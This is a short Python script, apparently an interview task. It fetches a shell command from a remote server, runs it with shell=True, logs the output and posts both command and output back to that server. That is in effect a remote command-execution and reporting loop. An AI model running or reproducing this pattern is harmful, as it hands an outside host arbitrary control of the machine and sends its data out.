import requests
from subprocess import Popen, PIPE
import logging

URL = 'http://gptl.ru/interview_task/api/commands'
param = {'aim':'python_developer_job'} 

def get_call (url, call_param):
    #calling GET-inquiry
    response = requests.get(url, params = call_param)
    #extract useful data from response
    in_data = response.json()['data']
    return in_data

def create_proc (func):
    #create subprocess
    new_proc = Popen( func, shell = True, stdout = PIPE, stderr = PIPE )
    #waiting for subprocess execution
    new_proc.wait()
    #get tuple with stdout and stderr
    res = new_proc.communicate()
    return res

def command_check (res):
    #case of incorrect command processing
    if res[1] != '':
        out_data = res[1]
    else:
        out_data = res[0]
    return out_data

def logger (out_data):
    #set logging config
    logging.basicConfig (format='%(message)s', filename='logfile.log',
                                                  level = logging.INFO)
    #except 'urllib3' from log
    logging.getLogger ("urllib3").setLevel (logging.WARNING)
    #add results in log-file
    logging.info (out_data)

def post_call (url, in_data, out_data):
    #data for sending to the server
    payload = {'command' : in_data, 'result' : out_data }
    #call POST-inquiry
    push = requests.post (url, data = payload) 


data = get_call (URL, param)
if data == '':
    to_log = '! No command from server !\n'
    logger (to_log)
else:
    com_res = create_proc (data)
    to_log = command_check (com_res)
    logger (to_log)
    post_call (URL, data, to_log)
